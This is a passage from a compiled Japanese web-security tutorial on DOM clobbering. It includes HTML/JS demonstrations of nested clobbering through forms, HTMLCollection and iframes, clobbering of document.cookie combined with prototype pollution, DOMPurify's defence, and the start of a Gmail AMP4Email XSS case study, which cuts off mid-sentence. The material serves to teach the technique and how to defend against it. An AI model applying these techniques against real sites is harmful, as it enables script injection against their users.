<\/script>\n</body>\n</html>\n')),(0,a.kt)("h2",{id:"\u30cd\u30b9\u30c8\u3055\u308c\u305fdom-clobbering"},"\u30cd\u30b9\u30c8\u3055\u308c\u305fDOM Clobbering"),(0,a.kt)("p",null,"\u524d\u306e\u4f8b\u3067\u306f\u3001DOM\u3092\u4f7f\u7528\u3057\u3066 ",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," \u3092\u4e0a\u66f8\u304d\u3057\u3001\u4e88\u671f\u3057\u306a\u3044\u52d5\u4f5c\u3092\u4f5c\u6210\u3057\u307e\u3057\u305f\u3002\u3057\u304b\u3057\u3001\u4e0a\u66f8\u304d\u5bfe\u8c61\u304c\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u306e\u5834\u5408\u306f\u3069\u3046\u3067\u3057\u3087\u3046\u304b\uff1f\u53ef\u80fd\u3067\u3057\u3087\u3046\u304b\uff1f"),(0,a.kt)("p",null,"\u4f8b\u3048\u3070\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"window.config.isTest")," \u306e\u3088\u3046\u306a\u5834\u5408\u3001DOM clobbering\u3092\u4f7f\u7528\u3057\u3066\u4e0a\u66f8\u304d\u3067\u304d\u307e\u3059\u304b\uff1f"),(0,a.kt)("p",null,"\u4e0a\u66f8\u304d\u3059\u308b\u65b9\u6cd5\u306f\u3044\u304f\u3064\u304b\u3042\u308a\u307e\u3059\u30021\u3064\u76ee\u306f\u3001HTML\u30bf\u30b0\u306e\u968e\u5c64\u95a2\u4fc2\u3001\u7279\u306bform\u8981\u7d20\u3092\u5229\u7528\u3059\u308b\u3053\u3068\u3067\u3059\u3002"),(0,a.kt)("p",null,"HTML\u306e",(0,a.kt)("a",{parentName:"p",href:"https://www.w3.org/TR/html52/sec-forms.html"},"\u4ed5\u69d8"),"\u306b\u306f\u3001\u6b21\u306e\u3088\u3046\u306a\u30bb\u30af\u30b7\u30e7\u30f3\u304c\u3042\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(4594).Z,width:"858",height:"275"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"form[name]")," \u307e\u305f\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"form[id]")," \u3092\u4f7f\u7528\u3057\u3066\u3001\u305d\u306e\u5b50\u8981\u7d20\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u307e\u3059\u3002\u4f8b\u3048\u3070\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config">\n    <input name="isTest" />\n    <button id="isProd"></button>\n  </form>\n  <script>\n    console.log(config) // <form id="config">\n    console.log(config.isTest) // <input name="isTest" />\n    console.log(config.isProd) // <button id="isProd"></button>\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u3053\u306e\u3088\u3046\u306b\u3057\u3066\u30012\u30ec\u30d9\u30eb\u306eDOM clobbering\u3092\u4f5c\u6210\u3067\u304d\u307e\u3059\u3002\u305f\u3060\u3057\u3001\u6ce8\u610f\u3059\u3079\u304d\u70b9\u304c1\u3064\u3042\u308a\u307e\u3059\u3002\u3053\u3053\u306b\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"<a>")," \u304c\u306a\u3044\u305f\u3081\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u306e\u7d50\u679c\u306f\u4f7f\u7528\u3067\u304d\u306a\u3044\u5f62\u5f0f\u306b\u306a\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u3088\u308a\u60aa\u7528\u3057\u3084\u3059\u3044\u6a5f\u4f1a\u306f\u3001\u4e0a\u66f8\u304d\u3057\u305f\u3044\u3082\u306e\u304c ",(0,a.kt)("inlineCode",{parentName:"p"},"value")," \u30d7\u30ed\u30d1\u30c6\u30a3\u3092\u4f7f\u7528\u3057\u3066\u30a2\u30af\u30bb\u30b9\u3055\u308c\u308b\u5834\u5408\u3067\u3059\u3002\u4f8b\u3048\u3070\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"config.environment.value"),"\u3002\u3053\u306e\u5834\u5408\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<input>")," \u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"value")," \u5c5e\u6027\u3092\u4f7f\u7528\u3057\u3066\u4e0a\u66f8\u304d\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config">\n    <input name="enviroment" value="test" />\n  </form>\n  <script>\n    console.log(config.enviroment.value) // test\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u7c21\u5358\u306b\u8a00\u3046\u3068\u3001\u7d44\u307f\u8fbc\u307f\u5c5e\u6027\u306e\u307f\u3092\u4e0a\u66f8\u304d\u3067\u304d\u3001\u305d\u308c\u4ee5\u5916\u306f\u3067\u304d\u307e\u305b\u3093\u3002"),(0,a.kt)("p",null,"HTML\u81ea\u4f53\u306e\u968e\u5c64\u69cb\u9020\u3092\u5229\u7528\u3059\u308b\u3053\u3068\u306b\u52a0\u3048\u3066\u3001\u3082\u30461\u3064\u306e\u6a5f\u80fd\u3067\u3042\u308b ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u3092\u5229\u7528\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u4ed5\u69d8\u306e\u300cNamed access on the Window object\u300d\u306b\u95a2\u3059\u308b\u4ee5\u524d\u306e\u30bb\u30af\u30b7\u30e7\u30f3\u3067\u3001\u5024\u304c\u4f55\u3067\u3042\u308b\u304b\u3092\u6c7a\u5b9a\u3059\u308b\u6bb5\u843d\u306f\u6b21\u306e\u3088\u3046\u306b\u8a18\u8ff0\u3055\u308c\u3066\u3044\u307e\u3059\u3002"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(7415).Z,width:"1457",height:"420"})),(0,a.kt)("p",null,"\u8fd4\u3055\u308c\u308b\u3082\u306e\u304c\u8907\u6570\u3042\u308b\u5834\u5408\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u304c\u8fd4\u3055\u308c\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config"></a>\n  <script>\n    console.log(config) // HTMLCollection(2)\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u3067\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u3067\u4f55\u304c\u3067\u304d\u308b\u3067\u3057\u3087\u3046\u304b\uff1f",(0,a.kt)("a",{parentName:"p",href:"https://dom.spec.whatwg.org/#interface-htmlcollection"},"4.2.10.2. Interface HTMLCollection"),"\u306b\u306f\u3001name\u307e\u305f\u306fid\u3092\u4f7f\u7528\u3057\u3066 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u5185\u306e\u8981\u7d20\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u308b\u3068\u8a18\u8f09\u3055\u308c\u3066\u3044\u307e\u3059\u3002"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(8312).Z,width:"703",height:"256"})),(0,a.kt)("p",null,"\u3053\u306e\u3088\u3046\u306b\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config" name="apiUrl" href="https://huli.tw"></a>\n  <script>\n    console.log(config.apiUrl + \'\')\n    // https://huli.tw\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u540c\u3058id\u3092\u4f7f\u7528\u3057\u3066 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u3092\u751f\u6210\u3057\u3001\u6b21\u306bname\u3092\u4f7f\u7528\u3057\u3066 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u304b\u3089\u7279\u5b9a\u306e\u8981\u7d20\u3092\u53d6\u5f97\u3057\u30012\u30ec\u30d9\u30eb\u306e\u52b9\u679c\u3092\u9054\u6210\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u305d\u3057\u3066\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<form>")," \u3068 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u3092\u7d44\u307f\u5408\u308f\u305b\u308b\u3068\u30013\u30ec\u30d9\u30eb\u3092\u9054\u6210\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config"></form>\n  <form id="config" name="prod">\n    <input name="apiUrl" value="123" />\n  </form>\n  <script>\n    console.log(config.prod.apiUrl.value) //123\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u540c\u3058id\u3092\u4f7f\u7528\u3059\u308b\u3053\u3068\u3067\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"config")," \u304cHTMLCollection\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\u6b21\u306b\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"config.prod")," \u3092\u4f7f\u7528\u3057\u3066\u3001HTMLCollection\u304b\u3089name\u304cprod\u306e\u8981\u7d20\u3001\u3064\u307e\u308a\u30d5\u30a9\u30fc\u30e0\u3092\u53d6\u5f97\u3067\u304d\u307e\u3059\u3002\u6b21\u306b\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"form.apiUrl")," \u3092\u4f7f\u7528\u3057\u3066\u30d5\u30a9\u30fc\u30e0\u306e\u4e0b\u306einput\u306b\u30a2\u30af\u30bb\u30b9\u3057\u3001\u6700\u5f8c\u306bvalue\u3092\u4f7f\u7528\u3057\u3066\u305d\u306e\u5c5e\u6027\u3092\u53d6\u5f97\u3057\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u3057\u305f\u304c\u3063\u3066\u3001\u76ee\u7684\u306e\u5c5e\u6027\u304cHTML\u5c5e\u6027\u3067\u3042\u308b\u5834\u5408\u30014\u30ec\u30d9\u30eb\u3092\u6301\u3064\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u305d\u3046\u3067\u306a\u3044\u5834\u5408\u306f\u30013\u30ec\u30d9\u30eb\u3057\u304b\u6301\u3064\u3053\u3068\u304c\u3067\u304d\u307e\u305b\u3093\u3002"),(0,a.kt)("p",null,"\u305f\u3060\u3057\u3001Firefox\u3067\u306f\u5c11\u3057\u7570\u306a\u308a\u307e\u3059\u3002Firefox\u3067\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u306f\u8fd4\u3055\u308c\u307e\u305b\u3093\u3002\u4f8b\u3048\u3070\u3001\u540c\u3058\u30b3\u30fc\u30c9\u306e\u5834\u5408\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config"></a>\n  <script>\n    console.log(config) // <a id="config"></a>\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"Firefox\u3067\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u3067\u306f\u306a\u304f\u3001\u6700\u521d\u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"<a>")," \u8981\u7d20\u306e\u307f\u304c\u51fa\u529b\u3055\u308c\u307e\u3059\u3002\u3057\u305f\u304c\u3063\u3066\u3001Firefox\u3067\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u3092\u4f7f\u7528\u3067\u304d\u305a\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"<form>")," \u3068\u5f8c\u3067\u8aac\u660e\u3059\u308b ",(0,a.kt)("inlineCode",{parentName:"p"},"<iframe>")," \u306e\u307f\u3092\u4f7f\u7528\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("h2",{id:"\u3055\u3089\u306b\u30cd\u30b9\u30c8\u3055\u308c\u305fdom-clobbering"},"\u3055\u3089\u306b\u30cd\u30b9\u30c8\u3055\u308c\u305fDOM Clobbering"),(0,a.kt)("p",null,"\u524d\u8ff0\u306e3\u30ec\u30d9\u30eb\u307e\u305f\u306f\u6761\u4ef6\u4ed8\u304d\u30674\u30ec\u30d9\u30eb\u306f\u3059\u3067\u306b\u9650\u754c\u3067\u3059\u3002\u3053\u306e\u5236\u9650\u3092\u7a81\u7834\u3059\u308b\u65b9\u6cd5\u306f\u3042\u308a\u307e\u3059\u304b\uff1f"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/research/dom-clobbering-strikes-back"},"DOM Clobbering strikes back"),"\u3067\u8aac\u660e\u3055\u308c\u3066\u3044\u308b\u30c6\u30af\u30cb\u30c3\u30af\u306b\u3088\u308b\u3068\u3001iframe\u3092\u4f7f\u7528\u3059\u308b\u3053\u3068\u3067\u9054\u6210\u3067\u304d\u307e\u3059\uff01"),(0,a.kt)("p",null,"iframe\u3092\u4f5c\u6210\u3057\u3066\u540d\u524d\u3092\u4ed8\u3051\u308b\u3068\u3001\u305d\u306e\u540d\u524d\u3092\u4f7f\u7528\u3057\u3066iframe\u5185\u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u307e\u3059\u3002\u6b21\u306e\u3088\u3046\u306b\u884c\u3046\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <iframe name="config" srcdoc=\'\n    <a id="apiUrl"></a>\n  \'></iframe>\n  <script>\n    setTimeout(() => {\n      console.log(config.apiUrl) // <a id="apiUrl"></a>\n    }, 500)\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u3053\u3053\u3067 ",(0,a.kt)("inlineCode",{parentName:"p"},"setTimeout")," \u3092\u4f7f\u7528\u3059\u308b\u7406\u7531\u306f\u3001iframe\u304c\u540c\u671f\u7684\u306b\u8aad\u307f\u8fbc\u307e\u308c\u306a\u3044\u305f\u3081\u3001iframe\u5185\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u306b\u6b63\u3057\u304f\u30a2\u30af\u30bb\u30b9\u3059\u308b\u306b\u306f\u6642\u9593\u304c\u304b\u304b\u308b\u305f\u3081\u3067\u3059\u3002"),(0,a.kt)("p",null,"iframe\u306e\u52a9\u3051\u3092\u501f\u308a\u3066\u3001\u3055\u3089\u306b\u591a\u304f\u306e\u30ec\u30d9\u30eb\u3092\u4f5c\u6210\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <iframe name="moreLevel" srcdoc=\'\n    <form id="config"></form>\n    <form id="config" name="prod">\n      <input name="apiUrl" value="123" />\n    </form>\n  \'></iframe>\n  <script>\n    setTimeout(() => {\n      console.log(moreLevel.config.prod.apiUrl.value) //123\n    }, 500)\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u3055\u3089\u306b\u591a\u304f\u306e\u30ec\u30d9\u30eb\u304c\u5fc5\u8981\u306a\u5834\u5408\u306f\u3001@splitline\u306b\u3088\u3063\u3066\u4f5c\u6210\u3055\u308c\u305f\u3053\u306e\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u3092\u4f7f\u7528\u3067\u304d\u307e\u3059\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://splitline.github.io/DOM-Clobber3r/"},"DOM Clobber3r")),(0,a.kt)("h2",{id:"document\u3092\u4ecb\u3057\u305f\u653b\u6483\u5bfe\u8c61\u306e\u62e1\u5927"},"document\u3092\u4ecb\u3057\u305f\u653b\u6483\u5bfe\u8c61\u306e\u62e1\u5927"),(0,a.kt)("p",null,"\u524d\u8ff0\u306e\u3088\u3046\u306b\u3001DOM clobbering\u3092\u5229\u7528\u3059\u308b\u6a5f\u4f1a\u306f\u9ad8\u304f\u3042\u308a\u307e\u305b\u3093\u3002\u306a\u305c\u306a\u3089\u3001\u30b3\u30fc\u30c9\u306b\u306f\u307e\u305a\u5ba3\u8a00\u3055\u308c\u3066\u3044\u306a\u3044\u30b0\u30ed\u30fc\u30d0\u30eb\u5909\u6570\u3092\u4f7f\u7528\u3059\u308b\u5834\u6240\u304c\u5fc5\u8981\u3060\u304b\u3089\u3067\u3059\u3002\u3053\u306e\u3088\u3046\u306a\u72b6\u6cc1\u306f\u3001\u958b\u767a\u4e2d\u306bESLint\u306b\u3088\u3063\u3066\u901a\u5e38\u691c\u51fa\u3055\u308c\u308b\u305f\u3081\u3001\u3069\u306e\u3088\u3046\u306b\u3057\u3066\u30aa\u30f3\u30e9\u30a4\u30f3\u306b\u306a\u3063\u305f\u306e\u3067\u3057\u3087\u3046\u304b\uff1f"),(0,a.kt)("p",null,"DOM clobbering\u306e\u529b\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u306b\u52a0\u3048\u3066\u3001\u540d\u524d\u3068\u7d44\u307f\u5408\u308f\u305b\u308b\u3053\u3068\u3067 ",(0,a.kt)("inlineCode",{parentName:"p"},"document")," \u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u8981\u7d20\u304c\u3044\u304f\u3064\u304b\u3042\u308b\u3068\u3044\u3046\u4e8b\u5b9f\u306b\u3042\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u7406\u89e3\u3059\u308b\u305f\u3081\u306b\u76f4\u63a5\u4f8b\u3092\u898b\u3066\u307f\u307e\u3057\u3087\u3046\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n</head>\n<body>\n  <img name=cookie>\n  <form id=test>\n    <input name=lastElementChild>\n    <div>I am last child</div>\n  </form>\n  <embed name=getElementById></embed>\n  <script>\n    console.log(document.cookie) // <img name="cookie">\n    console.log(document.querySelector(\'#test\').lastElementChild) // <input name=lastElementChild>\n    console.log(document.getElementById) // <embed name=getElementById></embed>\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u3053\u3053\u3067\u306f\u3001HTML\u8981\u7d20\u3092\u4f7f\u7528\u3057\u3066document\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u307e\u3057\u305f\u3002\u5143\u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"document.cookie")," \u306fcookie\u3092\u8868\u793a\u3059\u308b\u306f\u305a\u3067\u3059\u304c\u3001\u4eca\u3067\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"<img name=cookie>")," \u8981\u7d20\u306b\u306a\u3063\u3066\u3044\u307e\u3059\u3002\u3055\u3089\u306b\u3001\u6700\u5f8c\u306e\u8981\u7d20\u3092\u8fd4\u3059\u306f\u305a\u306e ",(0,a.kt)("inlineCode",{parentName:"p"},"lastElementChild")," \u306f\u3001\u30d5\u30a9\u30fc\u30e0\u306e\u4e0b\u306e\u540d\u524d\u306b\u3088\u3063\u3066\u4e0a\u66f8\u304d\u3055\u308c\u3001\u540c\u3058\u540d\u524d\u306e\u8981\u7d20\u304c\u53d6\u5f97\u3055\u308c\u307e\u3059\u3002"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"document.getElementById")," \u3067\u3055\u3048DOM\u306b\u3088\u3063\u3066\u4e0a\u66f8\u304d\u3055\u308c\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"document.getElementById()")," \u3092\u547c\u3073\u51fa\u3059\u3068\u304d\u306b\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u3001\u30da\u30fc\u30b8\u5168\u4f53\u304c\u30af\u30e9\u30c3\u30b7\u30e5\u3059\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,"CTF\u30c1\u30e3\u30ec\u30f3\u30b8\u3067\u306f\u3001\u4ee5\u524d\u306b\u8a00\u53ca\u3057\u305f\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u6c5a\u67d3\u3068\u7d44\u307f\u5408\u308f\u305b\u3066\u4f7f\u7528\u3055\u308c\u308b\u3053\u3068\u304c\u3088\u304f\u3042\u308a\u307e\u3059\u3002\u3088\u308a\u826f\u3044\u7d50\u679c\u304c\u5f97\u3089\u308c\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n</head>\n<body>\n  <img name=cookie>\n  <script>\n    // \u5c5e\u6027\u3092\u30ab\u30b9\u30bf\u30e0\u95a2\u6570\u306b\u6c5a\u67d3\u3067\u304d\u308b\u3068\u4eee\u5b9a\u3057\u307e\u3059\n    Object.prototype.toString = () => \'a=1\'\n    console.log(`cookie: ${document.cookie}`) // cookie: a=1\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u306a\u305c\u3067\u3057\u3087\u3046\u304b\uff1f"),(0,a.kt)("p",null,"\u73fe\u5728\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"document.cookie")," \u306fHTML\u8981\u7d20\u3067\u3059\u3002\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u69cb\u6587\u3092\u4f7f\u7528\u3059\u308b\u5834\u5408\u3001\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u6587\u5b57\u5217\u3067\u306a\u3044\u5834\u5408\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u30e1\u30bd\u30c3\u30c9\u304c\u81ea\u52d5\u7684\u306b\u547c\u3073\u51fa\u3055\u308c\u307e\u3059\u3002\u305f\u3060\u3057\u3001HTML\u8981\u7d20\u81ea\u4f53\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u3092\u5b9f\u88c5\u3057\u3066\u3044\u307e\u305b\u3093\u3002\u3057\u305f\u304c\u3063\u3066\u3001\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u30c1\u30a7\u30fc\u30f3\u306b\u5f93\u3063\u3066\u3001\u6700\u7d42\u7684\u306b\u6c5a\u67d3\u3055\u308c\u305f ",(0,a.kt)("inlineCode",{parentName:"p"},"Object.prototype.toString")," \u304c\u547c\u3073\u51fa\u3055\u308c\u3001\u6c5a\u67d3\u3055\u308c\u305f\u7d50\u679c\u304c\u8fd4\u3055\u308c\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u3053\u308c\u3089\u306e\u8106\u5f31\u6027\u3092\u9023\u9396\u3055\u305b\u308b\u3053\u3068\u306b\u3088\u308a\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"document.cookie")," \u306e\u5024\u3092\u64cd\u4f5c\u3057\u3001\u305d\u306e\u5f8c\u306e\u30d5\u30ed\u30fc\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u4ee5\u524d\u306b\u7d39\u4ecb\u3057\u305fDOMPurify\u306f\u3001\u30b5\u30cb\u30bf\u30a4\u30ba\u6642\u306b\u3053\u306e\u90e8\u5206\u3092\u7279\u5225\u306b\u51e6\u7406\u3057\u3066\u3044\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"// https://github.com/cure53/DOMPurify/blob/d5060b309b5942fc5698070fbce83a781d31b8e9/src/purify.js#L1102\nconst _isValidAttribute = function (lcTag, lcName, value) {\n  /* \u5c5e\u6027\u304cclobber\u3067\u304d\u306a\u3044\u3053\u3068\u3092\u78ba\u8a8d\u3057\u307e\u3059 */\n  if (\n    SANITIZE_DOM &&\n    (lcName === 'id' || lcName === 'name') &&\n    (value in document || value in formElement)\n  ) {\n    return false;\n  }\n  // ...\n}\n")),(0,a.kt)("p",null,"id\u307e\u305f\u306fname\u306e\u5024\u304c\u3059\u3067\u306b ",(0,a.kt)("inlineCode",{parentName:"p"},"document")," \u307e\u305f\u306f ",(0,a.kt)("inlineCode",{parentName:"p"},"formElement")," \u306b\u5b58\u5728\u3059\u308b\u5834\u5408\u3001\u30b9\u30ad\u30c3\u30d7\u3055\u308c\u3001document\u304a\u3088\u3073form\u306b\u5bfe\u3059\u308bDOM clobbering\u306e\u9632\u6b62\u306f\u884c\u308f\u308c\u307e\u305b\u3093\u3002"),(0,a.kt)("p",null,"\u4ee5\u524d\u306b\u7d39\u4ecb\u3057\u305fSanitizer API\u306b\u3064\u3044\u3066\u306f\u3001",(0,a.kt)("a",{parentName:"p",href:"https://wicg.github.io/sanitizer-api/#dom-clobbering"},"\u4ed5\u69d8"),"\u306b\u300cSanitizer API\u306f\u30c7\u30d5\u30a9\u30eb\u30c8\u306e\u72b6\u614b\u3067\u306fDOM clobbering\u653b\u6483\u304b\u3089\u4fdd\u8b77\u3057\u307e\u305b\u3093\u300d\u3068\u660e\u78ba\u306b\u8a18\u8f09\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30c7\u30d5\u30a9\u30eb\u30c8\u3067\u306fDOM clobbering\u306b\u5bfe\u3059\u308b\u4fdd\u8b77\u306f\u63d0\u4f9b\u3055\u308c\u307e\u305b\u3093\u3002"),(0,a.kt)("h2",{id:"\u4e8b\u4f8b\u7814\u7a76gmail-amp4email-xss"},"\u4e8b\u4f8b\u7814\u7a76\uff1aGmail AMP4Email XSS"),(0,a.kt)("p",null,"2019\u5e74\u3001Gmail\u306b\u306fDOM clobbering\u3092\u4ecb\u3057\u3066\u60aa\u7528\u3067\u304d\u308b\u8106\u5f31\u6027\u304c\u3042\u308a\u307e\u3057\u305f\u3002\u5305\u62ec\u7684\u306a\u89e3\u8aac\u306f\u3053\u3061\u3089\u306b\u3042\u308a\u307e\u3059\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://research.securitum.com/xss-in-amp4email-dom-clobbering"},"XSS in GMail\u2019s AMP4Email via DOM Clobbering"),"\u3002\u4ee5\u4e0b\u306b\u3001\u30d7\u30ed\u30bb\u30b9\u3092\u7c21\u5358\u306b\u8aac\u660e\u3057\u307e\u3059\uff08\u5185\u5bb9\u306f\u4e0a\u8a18\u306e\u8a18\u4e8b\u304b\u3089\u5f15\u7528\uff09\u3002"),(0,a.kt)("p",null,"\u7c21\u5358\u306b\u8a00\u3046\u3068\u3001Gmail\u3067\u306f\u4e00\u90e8\u306eAMP\u6a5f\u80fd\u3092\u4f7f\u7528\u3067\u304d\u3001Google\u306f\u3053\u306e\u5f62\u5f0f\u306e\u30d0\u30ea\u30c7\u30fc\u30bf\u30fc\u304c\u53b3\u683c\u3067\u3042\u308b\u305f\u3081\u3001\u5f93\u6765\u306e\u65b9\u6cd5\u3067XSS\u653b\u6483\u3092\u5b9f\u884c\u3059\u308b\u3053\u3068\u306f\u56f0\u96e3\u3067\u3059\u3002"),(0,a.kt)("p",null,"\u3057\u304b\u3057\u3001HTML\u8981\u7d20\u306bid\u3092\u8a2d\u5b9a\u3067\u304d\u308b\u3053\u3068\u3092\u767a\u898b\u3057\u305f\u4eba\u304c\u3044\u307e\u3057\u305f\u3002\u5f7c\u3089\u306f\u3001",(0,a.kt)("inlineCode",{parentName:"p"},'<a id="AMP_MODE">')," \u3092\u8a2d\u5b9a\u3059\u308b\u3068\u3001\u30b3\u30f3\u30bd\u30fc\u30eb\u306b\u30b9\u30af\u30ea\u30d7\u30c8\u8aad\u307f\u8fbc\u307f\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u3001URL\u306e\u4e00\u90e8\u304c ",(0,a.kt)("inlineCode",{parentName:"p"},"undefined")," \u3067\u3042\u308b\u3053\u3068\u304c\u308f\u304b\u308a\u307e\u3057\u305f\u3002\u30b3\u30fc\u30c9\u3092\u6ce8\u610f\u6df1\u304f\u8abf\u3079\u305f\u5f8c\u3001\u6b21\u306e\u3088\u3046\u306a\u30b3\u30fc\u30c9\u30b9\u30cb\u30da\u30c3\u30c8\u3092\u898b\u3064\u3051\u307e\u3057\u305f\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'var script = window.document.createElement("script");\nscript.async = false;\n\nvar loc;\nif (AMP_MODE.test && window.testLocation) {\n    loc = window.testLocation\n} else {\n    loc = window.location;\n}\n\nif (AMP_MODE.localDev) {\n    loc = loc.protocol + "//" + loc.host + "/dist"\n} else {\n    loc = "https://cdn.ampproject.org";\n}\n\nvar singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";\nb.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";\n\ndocument.head.appendChild(b);\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"AMP_MODE.test")," \u3068 ",(0,a.kt)("inlineCode",{parentName:"p"},"AMP_MODE.localDev")," \u306e\u4e21\u65b9\u3092\u771f\u306b\u3057\u3001",(0,a.kt)("inlineCode",{parentName:"p"},"window.testLocation")," 